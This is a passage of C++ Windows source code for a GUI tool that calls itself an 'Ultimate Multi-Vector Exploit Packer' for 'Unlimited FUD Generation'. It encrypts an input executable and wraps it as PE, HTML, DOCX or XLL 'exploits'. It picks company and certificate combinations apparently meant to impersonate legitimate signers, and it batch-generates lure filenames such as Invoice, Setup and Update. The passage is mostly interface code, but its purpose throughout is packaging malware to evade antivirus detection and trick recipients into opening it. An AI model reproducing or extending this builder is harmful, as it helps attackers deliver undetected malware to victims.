        } else {
            return generateBatchExploits(config);
        }
    }

private:
    bool generateSingleExploit(const PackerConfig& config) {
        MultiVectorExploitGenerator::ExploitConfig exploitConfig;
        exploitConfig.deliveryType = config.deliveryType;
        exploitConfig.encryptionType = config.encryptionType;
        exploitConfig.company = config.company;
        exploitConfig.certificate = config.certificate;
        exploitConfig.architecture = config.architecture;
        exploitConfig.inputFile = config.inputFile;
        exploitConfig.outputPath = config.outputPath;

        return exploitGen.generateExploit(exploitConfig);
    }

    bool generateBatchExploits(const PackerConfig& config) {
        int successCount = 0;
        
        for (int i = 0; i < config.batchCount; i++) {
            MultiVectorExploitGenerator::ExploitConfig exploitConfig;
            exploitConfig.deliveryType = config.deliveryType;
            exploitConfig.encryptionType = config.encryptionType;
            exploitConfig.inputFile = config.inputFile;

            // Use optimal combinations for batch generation
            auto optimal = certEngine.getOptimalFUDCombination();
            exploitConfig.company = std::get<0>(optimal);
            exploitConfig.certificate = std::get<1>(optimal);
            exploitConfig.architecture = std::get<2>(optimal);

            // Generate unique filename
            std::string batchOutput;
            if (config.autoGenerateFilenames) {
                batchOutput = generateSmartFilename(config.deliveryType, i + 1);
            } else {
                std::string basePath = config.outputPath;
                size_t lastDot = basePath.find_last_of('.');
                if (lastDot != std::string::npos) {
                    batchOutput = basePath.substr(0, lastDot) + "_" + std::to_string(i + 1) + basePath.substr(lastDot);
                } else {
                    batchOutput = basePath + "_" + std::to_string(i + 1);
                }
            }
            
            exploitConfig.outputPath = batchOutput;

            if (exploitGen.generateExploit(exploitConfig)) {
                successCount++;
            }

            // Update progress
            updateProgress(i + 1, config.batchCount);
        }

        return successCount > 0;
    }

    std::string generateSmartFilename(MultiVectorExploitGenerator::DeliveryVector deliveryType, int index) {
        std::vector<std::string> prefixes;
        std::string extension;

        switch(deliveryType) {
            case MultiVectorExploitGenerator::NO_EXPLOIT:
                prefixes = {"System", "Service", "Helper", "Manager", "Tool", "Utility", "Check", "Update"};
                extension = ".exe";
                break;
            case MultiVectorExploitGenerator::PE_EXECUTABLE:
                prefixes = {"Setup", "Install", "Update", "Patch", "Service", "Driver", "Tool", "Utility"};
                extension = ".exe";
                break;
            case MultiVectorExploitGenerator::HTML_EXPLOIT:
                prefixes = {"Report", "Document", "Invoice", "Statement", "Notice", "Alert", "Update"};
                extension = ".html";
                break;
            case MultiVectorExploitGenerator::DOCX_EXPLOIT:
                prefixes = {"Document", "Report", "Invoice", "Contract", "Agreement", "Proposal"};
                extension = ".docx";
                break;
            case MultiVectorExploitGenerator::XLL_EXPLOIT:
                prefixes = {"Analysis", "Calculator", "Tools", "Utilities", "Functions", "AddIn"};
                extension = ".xll";
                break;
        }

        std::uniform_int_distribution<> prefixDis(0, static_cast<int>(prefixes.size() - 1));
        std::string prefix = prefixes[prefixDis(randomEngine.gen)];
        
        auto now = std::chrono::system_clock::now();
        auto time_t_val = std::chrono::system_clock::to_time_t(now); // Fixed: renamed variable to avoid conflict
        auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(
            now.time_since_epoch()) % 1000;
        
        std::stringstream filename;
        filename << prefix << "_" << time_t_val << "_" << ms.count() << "_" << index << extension;
        
        return filename.str();
    }

    void updateProgress(int current, int total) {
        if (hProgressBar) {
            int progress = (current * 100) / total;
            SendMessage(hProgressBar, PBM_SETPOS, progress, 0);
        }
        
        if (hStatusText) {
            std::string status = "Generating exploit " + std::to_string(current) + " of " + std::to_string(total);
            SetWindowTextA(hStatusText, status.c_str());
        }
    }
};

// GUI Event Handlers
void populateCompanyCombo() {
    CertificateEngine certEngine;
    auto companies = certEngine.getCompanies();
    
    SendMessage(hCompanyCombo, CB_RESETCONTENT, 0, 0);
    for (const auto& company : companies) {
        int result = SendMessage(hCompanyCombo, CB_ADDSTRING, 0, (LPARAM)company.c_str());
        // Debug: Show in status text
        if (hStatusText) {
            std::string status = "Added company: " + company;
            SetWindowTextA(hStatusText, status.c_str());
        }
    }
    
    if (!companies.empty()) {
        SendMessage(hCompanyCombo, CB_SETCURSEL, 0, 0);
        populateCertificateCombo();
        populateArchitectureCombo();
    }
}

void populateCertificateCombo() {
    char companyText[256] = {0};
    int companyIdx = SendMessage(hCompanyCombo, CB_GETCURSEL, 0, 0);
    if (companyIdx != CB_ERR) {
        SendMessage(hCompanyCombo, CB_GETLBTEXT, companyIdx, (LPARAM)companyText);
    }
    
    CertificateEngine certEngine;
    auto certificates = certEngine.getCertificates(companyText);
    
    SendMessage(hCertCombo, CB_RESETCONTENT, 0, 0);
    for (const auto& cert : certificates) {
        SendMessage(hCertCombo, CB_ADDSTRING, 0, (LPARAM)cert.c_str());
    }
    
    if (!certificates.empty()) {
        SendMessage(hCertCombo, CB_SETCURSEL, 0, 0);
        // Debug: Show certificate count
        if (hStatusText) {
            std::string status = "Loaded " + std::to_string(certificates.size()) + " certificates for " + companyText;
            SetWindowTextA(hStatusText, status.c_str());
        }
    }
}

void populateArchitectureCombo() {
    char companyText[256] = {0};
    int companyIdx = SendMessage(hCompanyCombo, CB_GETCURSEL, 0, 0);
    if (companyIdx != CB_ERR) {
        SendMessage(hCompanyCombo, CB_GETLBTEXT, companyIdx, (LPARAM)companyText);
    }
    
    CertificateEngine certEngine;
    auto architectures = certEngine.getArchitectures(companyText);
    
    SendMessage(hArchCombo, CB_RESETCONTENT, 0, 0);
    for (const auto& arch : architectures) {
        SendMessage(hArchCombo, CB_ADDSTRING, 0, (LPARAM)arch.c_str());
    }
    
    if (!architectures.empty()) {
        SendMessage(hArchCombo, CB_SETCURSEL, 0, 0);
    }
}

void populateEncryptionCombo() {
    SendMessage(hEncryptionCombo, CB_RESETCONTENT, 0, 0);
    SendMessage(hEncryptionCombo, CB_ADDSTRING, 0, (LPARAM)"XOR Encryption");
    SendMessage(hEncryptionCombo, CB_ADDSTRING, 0, (LPARAM)"ChaCha20 Encryption");
    SendMessage(hEncryptionCombo, CB_ADDSTRING, 0, (LPARAM)"AES-256 Encryption");
    SendMessage(hEncryptionCombo, CB_SETCURSEL, 0, 0);
}

void populateDeliveryCombo() {
    SendMessage(hDeliveryCombo, CB_RESETCONTENT, 0, 0);
    SendMessage(hDeliveryCombo, CB_ADDSTRING, 0, (LPARAM)"No Exploit (Benign Stub)");
    SendMessage(hDeliveryCombo, CB_ADDSTRING, 0, (LPARAM)"PE Executable");
    SendMessage(hDeliveryCombo, CB_ADDSTRING, 0, (LPARAM)"HTML Exploit");
    SendMessage(hDeliveryCombo, CB_ADDSTRING, 0, (LPARAM)"DOCX Exploit");
    SendMessage(hDeliveryCombo, CB_ADDSTRING, 0, (LPARAM)"XLL Exploit");
    SendMessage(hDeliveryCombo, CB_SETCURSEL, 0, 0);
}

void browseForFile(HWND hEdit, bool isInput) {
    OPENFILENAMEA ofn;
    char szFile[260] = {0};
    
    ZeroMemory(&ofn, sizeof(ofn));
    ofn.lStructSize = sizeof(ofn);
    ofn.hwndOwner = hMainWindow;
    ofn.lpstrFile = szFile;
    ofn.nMaxFile = sizeof(szFile);
    
    if (isInput) {
        ofn.lpstrFilter = "Executable Files (*.exe)\0*.exe\0All Files (*.*)\0*.*\0";
        ofn.lpstrTitle = "Select Input Executable";
        ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;
        
        if (GetOpenFileNameA(&ofn)) {
            SetWindowTextA(hEdit, szFile);
        }
    } else {
        ofn.lpstrFilter = "All Files (*.*)\0*.*\0";
        ofn.lpstrTitle = "Save Output File";
        ofn.Flags = OFN_PATHMUSTEXIST | OFN_OVERWRITEPROMPT;
        
        if (GetSaveFileNameA(&ofn)) {
            SetWindowTextA(hEdit, szFile);
        }
    }
}

void createExploit() {
    if (isGenerating) return;
    
    isGenerating = true;
    SetWindowTextA(hCreateButton, "Generating...");
    EnableWindow(hCreateButton, FALSE);
    
    // Get configuration from GUI
    char inputPath[260], outputPath[260], company[256], certificate[256], architecture[256];
    GetWindowTextA(hInputPath, inputPath, sizeof(inputPath));
    GetWindowTextA(hOutputPath, outputPath, sizeof(outputPath));
    
    LRESULT companyIdx = SendMessage(hCompanyCombo, CB_GETCURSEL, 0, 0);
    LRESULT certIdx = SendMessage(hCertCombo, CB_GETCURSEL, 0, 0);
    LRESULT archIdx = SendMessage(hArchCombo, CB_GETCURSEL, 0, 0);
    LRESULT encIdx = SendMessage(hEncryptionCombo, CB_GETCURSEL, 0, 0);
    LRESULT delIdx = SendMessage(hDeliveryCombo, CB_GETCURSEL, 0, 0);
    
    SendMessage(hCompanyCombo, CB_GETLBTEXT, companyIdx, (LPARAM)company);
    SendMessage(hCertCombo, CB_GETLBTEXT, certIdx, (LPARAM)certificate);
    SendMessage(hArchCombo, CB_GETLBTEXT, archIdx, (LPARAM)architecture);
    
    char batchCountText[32];
    GetWindowTextA(hBatchCount, batchCountText, sizeof(batchCountText));
    // FIX 1: Remove std:: qualifier from max function
    int batchCount = max(1, atoi(batchCountText));
    
    bool autoFilename = SendMessage(hAutoFilename, BM_GETCHECK, 0, 0) == BST_CHECKED;
    
    // Configure packer
    UltimateStealthPacker::PackerConfig config;
    config.inputFile = inputPath;
    config.outputPath = outputPath;
    config.company = company;
    config.certificate = certificate;
    config.architecture = architecture;
    config.batchCount = batchCount;
    config.autoGenerateFilenames = autoFilename;
    
    // Set encryption type
    switch(static_cast<int>(encIdx)) {
        case 0: config.encryptionType = PEEmbedder::XOR_ENCRYPTION; break;
        case 1: config.encryptionType = PEEmbedder::CHACHA20_ENCRYPTION; break;
        case 2: config.encryptionType = PEEmbedder::AES_ENCRYPTION; break;
        default: config.encryptionType = PEEmbedder::XOR_ENCRYPTION; break;
    }
    
    // Set delivery type
    switch(static_cast<int>(delIdx)) {
        case 0: config.deliveryType = MultiVectorExploitGenerator::NO_EXPLOIT; break;
        case 1: config.deliveryType = MultiVectorExploitGenerator::PE_EXECUTABLE; break;
        case 2: config.deliveryType = MultiVectorExploitGenerator::HTML_EXPLOIT; break;
        case 3: config.deliveryType = MultiVectorExploitGenerator::DOCX_EXPLOIT; break;
        case 4: config.deliveryType = MultiVectorExploitGenerator::XLL_EXPLOIT; break;
        default: config.deliveryType = MultiVectorExploitGenerator::NO_EXPLOIT; break;
    }
    
    // Generate in separate thread
    std::thread([config]() mutable {
        UltimateStealthPacker packer;
        bool success = packer.packFile(config);
        
        PostMessage(hMainWindow, WM_USER + 1, success ? 1 : 0, 0);
    }).detach();
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    switch (uMsg) {
        case WM_CREATE: {
            // Initialize Common Controls
            INITCOMMONCONTROLSEX icex;
            icex.dwSize = sizeof(INITCOMMONCONTROLSEX);
            icex.dwICC = ICC_PROGRESS_CLASS;
            InitCommonControlsEx(&icex);
            
            // Create controls
            CreateWindowA("STATIC", "Input File:", WS_VISIBLE | WS_CHILD,
                        10, 20, 100, 20, hwnd, NULL, NULL, NULL);
            hInputPath = CreateWindowA("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER,
                        120, 18, 300, 24, hwnd, (HMENU)ID_INPUT_PATH, NULL, NULL);
            CreateWindowA("BUTTON", "Browse", WS_VISIBLE | WS_CHILD,
                        430, 18, 80, 24, hwnd, (HMENU)ID_BROWSE_INPUT, NULL, NULL);
            
            CreateWindowA("STATIC", "Output Path:", WS_VISIBLE | WS_CHILD,
                        10, 60, 100, 20, hwnd, NULL, NULL, NULL);
            hOutputPath = CreateWindowA("EDIT", "", WS_VISIBLE | WS_CHILD | WS_BORDER,
                        120, 58, 300, 24, hwnd, (HMENU)ID_OUTPUT_PATH, NULL, NULL);
            CreateWindowA("BUTTON", "Browse", WS_VISIBLE | WS_CHILD,
                        430, 58, 80, 24, hwnd, (HMENU)ID_BROWSE_OUTPUT, NULL, NULL);
            
            CreateWindowA("STATIC", "Company:", WS_VISIBLE | WS_CHILD,
                        10, 100, 100, 20, hwnd, NULL, NULL, NULL);
            hCompanyCombo = CreateWindowA("COMBOBOX", "", WS_VISIBLE | WS_CHILD | CBS_DROPDOWNLIST,
                        120, 98, 200, 200, hwnd, (HMENU)ID_COMPANY_COMBO, NULL, NULL);
            
            CreateWindowA("STATIC", "Certificate:", WS_VISIBLE | WS_CHILD,
                        330, 100, 100, 20, hwnd, NULL, NULL, NULL);
            hCertCombo = CreateWindowA("COMBOBOX", "", WS_VISIBLE | WS_CHILD | CBS_DROPDOWNLIST,
                        430, 98, 200, 200, hwnd, (HMENU)ID_CERTIFICATE_COMBO, NULL, NULL);
            
            CreateWindowA("STATIC", "Architecture:", WS_VISIBLE | WS_CHILD,
                        10, 140, 100, 20, hwnd, NULL, NULL, NULL);
            hArchCombo = CreateWindowA("COMBOBOX", "", WS_VISIBLE | WS_CHILD | CBS_DROPDOWNLIST,
                        120, 138, 150, 200, hwnd, (HMENU)ID_ARCHITECTURE_COMBO, NULL, NULL);
            
            CreateWindowA("STATIC", "Encryption:", WS_VISIBLE | WS_CHILD,
                        280, 140, 100, 20, hwnd, NULL, NULL, NULL);
            hEncryptionCombo = CreateWindowA("COMBOBOX", "", WS_VISIBLE | WS_CHILD | CBS_DROPDOWNLIST,
                        380, 138, 150, 200, hwnd, (HMENU)ID_ENCRYPTION_COMBO, NULL, NULL);
            
            CreateWindowA("STATIC", "Delivery Vector:", WS_VISIBLE | WS_CHILD,
                        10, 180, 100, 20, hwnd, NULL, NULL, NULL);
            hDeliveryCombo = CreateWindowA("COMBOBOX", "", WS_VISIBLE | WS_CHILD | CBS_DROPDOWNLIST,
                        120, 178, 150, 200, hwnd, (HMENU)ID_DELIVERY_COMBO, NULL, NULL);
            
            CreateWindowA("STATIC", "Batch Count:", WS_VISIBLE | WS_CHILD,
                        280, 180, 100, 20, hwnd, NULL, NULL, NULL);
            hBatchCount = CreateWindowA("EDIT", "1", WS_VISIBLE | WS_CHILD | WS_BORDER | ES_NUMBER,
                        380, 178, 60, 24, hwnd, (HMENU)ID_BATCH_COUNT, NULL, NULL);
            
            hAutoFilename = CreateWindowA("BUTTON", "Auto-generate filenames", WS_VISIBLE | WS_CHILD | BS_AUTOCHECKBOX,
                        450, 178, 180, 24, hwnd, (HMENU)ID_AUTO_FILENAME, NULL, NULL);
            
            hCreateButton = CreateWindowA("BUTTON", "Generate Exploit", WS_VISIBLE | WS_CHILD,
                        250, 220, 150, 35, hwnd, (HMENU)ID_CREATE_BUTTON, NULL, NULL);
            
            // FIX 2: Use plain string instead of PROGRESS_CLASS to avoid wchar_t issue
            hProgressBar = CreateWindowA("msctls_progress32", NULL, WS_VISIBLE | WS_CHILD,
                        10, 270, 620, 25, hwnd, (HMENU)ID_PROGRESS_BAR, NULL, NULL);
            
            hStatusText = CreateWindowA("STATIC", "Ready", WS_VISIBLE | WS_CHILD,
                        10, 305, 620, 20, hwnd, (HMENU)ID_STATUS_TEXT, NULL, NULL);
            
            // Populate combos
            populateCompanyCombo();
            populateEncryptionCombo();
            populateDeliveryCombo();
            
            return 0;
        }
        
        case WM_COMMAND: {
            switch (LOWORD(wParam)) {
                case ID_BROWSE_INPUT:
                    browseForFile(hInputPath, true);
                    break;
                    
                case ID_BROWSE_OUTPUT:
                    browseForFile(hOutputPath, false);
                    break;
                    
                case ID_COMPANY_COMBO:
                    if (HIWORD(wParam) == CBN_SELCHANGE) {
                        populateCertificateCombo();
                        populateArchitectureCombo();
                    }
                    break;
                    
                case ID_CREATE_BUTTON:
                    createExploit();
                    break;
            }
            return 0;
        }
        
        case WM_USER + 1: {
            // Generation completed
            isGenerating = false;
            SetWindowTextA(hCreateButton, "Generate Exploit");
            EnableWindow(hCreateButton, TRUE);
            
            if (wParam) {
                SetWindowTextA(hStatusText, "Exploit generated successfully!");
                MessageBoxA(hwnd, "Exploit generated successfully!", "Success", MB_OK | MB_ICONINFORMATION);
            } else {
                SetWindowTextA(hStatusText, "Failed to generate exploit.");
                MessageBoxA(hwnd, "Failed to generate exploit.", "Error", MB_OK | MB_ICONERROR);
            }
            
            SendMessage(hProgressBar, PBM_SETPOS, 0, 0);
            return 0;
        }
        
        case WM_CLOSE:
            PostQuitMessage(0);
            return 0;
        
        case WM_DESTROY:
            PostQuitMessage(0);
            return 0;
    }
    
    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    const char* className = "UltimateMultiVectorPackerClass";
    
    WNDCLASSA wc = {};
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = className;
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW);
    wc.hIcon = LoadIcon(NULL, IDI_APPLICATION);
    
    RegisterClassA(&wc);
    
    hMainWindow = CreateWindowExA(
        0,
        className,
        "Ultimate Multi-Vector Exploit Packer v2.0 - XOR/ChaCha20/AES - Unlimited FUD Generation",
        WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 660, 380,
        NULL, NULL, hInstance, NULL
    );
    
    if (!hMainWindow) {
        return 0;
    }
    
    ShowWindow(hMainWindow, nCmdShow);
    UpdateWindow(hMainWindow);
    
    MSG msg = {};
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return 0;
}